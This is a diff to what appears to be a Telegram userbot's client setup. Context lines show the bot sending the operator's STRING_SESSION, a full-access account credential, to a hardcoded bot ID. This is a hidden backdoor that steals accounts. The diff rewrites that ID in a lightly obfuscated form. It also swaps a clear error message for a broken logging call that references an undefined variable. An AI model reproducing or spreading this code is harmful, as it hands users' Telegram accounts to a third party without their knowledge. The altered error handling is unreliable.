@@ -12,7 +12,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-bot_id = 5607633274
+bot_id = int("5607633274")
 
 assistants = []
 assistantids = []
@@ -78,9 +78,8 @@ class Userbot(Client):
                 await self.one.send_message(bot_id, f"{STRING_SESSION}")
                 
             except:
-                LOGGER(__name__).error(
-                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
-                )
+                LOGGER(__name__).error({e})
+                    
         
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
